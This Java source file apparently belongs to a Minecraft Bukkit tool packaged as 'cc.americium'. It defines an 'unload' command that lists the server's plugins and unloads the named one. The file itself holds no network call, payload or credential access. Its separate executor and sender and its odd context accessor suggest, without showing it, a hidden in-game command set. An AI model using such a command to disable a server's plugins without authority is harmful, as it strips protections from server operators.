package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import java.util.ArrayList;

public class Unload implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"unload"};
    }

    @Override
    public String getDescription() {
        return "Attempts to unload a plugin.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();

        if (args.length == 0) {
            args = new String[]{"."};
        }

        Plugin found = null;
        ArrayList<String> plugins = new ArrayList<>();
        for (Plugin pl : Bukkit.getPluginManager().getPlugins()) {
            plugins.add(ChatColor.RED + pl.getName());
            if (pl.getName().equalsIgnoreCase(args[0])) {
                found = pl;
                break;
            }
        }

        if (found == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That plugin was not found! Here are all active plugins:");
            sender.sendMessage(String.join(ChatColor.GRAY + ", ", plugins) + ChatColor.GRAY + ".");
            return;
        }

        try {
            Utilities.unload(found, context.getZ_());
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully unloaded " + found.getName() + "!");
    }
}
